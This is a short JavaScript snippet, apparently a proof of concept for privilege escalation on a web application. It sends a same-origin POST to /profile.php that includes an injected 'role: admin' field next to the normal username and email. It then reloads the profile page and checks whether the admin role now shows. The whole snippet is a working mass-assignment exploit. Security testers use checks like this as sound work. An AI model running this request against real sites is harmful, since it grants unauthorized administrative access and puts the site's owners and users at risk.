(async () => {
  const username = 'testuser';
  const email = 'test@example.com';

  const response = await fetch('/profile.php', {
    method: 'POST',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      username: username,
      email: email,
      role: 'admin'
    })
  });

  const html = await response.text();

  console.log('HTTP status:', response.status);
  console.log(
    'Profile update accepted:',
    html.includes('Profile updated successfully.')
  );

  const check = await fetch('/profile.php', {
    credentials: 'same-origin'
  });

  const page = await check.text();

  console.log(
    'Admin role visible:',
    /Current role:\s*<strong>\s*admin\s*<\/strong>/i.test(page)
  );
})();
